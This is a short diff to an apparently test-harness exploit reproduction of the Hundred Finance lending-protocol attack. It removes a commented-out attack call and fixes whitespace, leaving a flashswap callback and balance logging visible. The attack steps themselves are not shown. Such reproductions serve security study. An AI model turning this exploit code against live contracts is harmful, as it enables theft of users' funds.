@@ -47,7 +47,6 @@ contract Exploit_HundredFinance is TestHarness {
 
     // Flashswap callback
     function uniswapV2Call(address sender, uint256 _amount0, uint256 _amount1, bytes calldata ) external {
-        // attackLogic(_amount0, _amount1, _data);
         require(sender == address(this), 'Not requested by this');
         require(msg.sender == address(pairUsdcWxdai), 'Only callable by pair');
 
@@ -87,7 +86,7 @@ contract Exploit_HundredFinance is TestHarness {
         console.log('------- STEP 6: ENDING BALANCES -------');
         console.log('Attacker');
         logBalances(address(this));
-        
+
         console.log('Hundred DAI Pool');
         logBalances(hxdai);
 
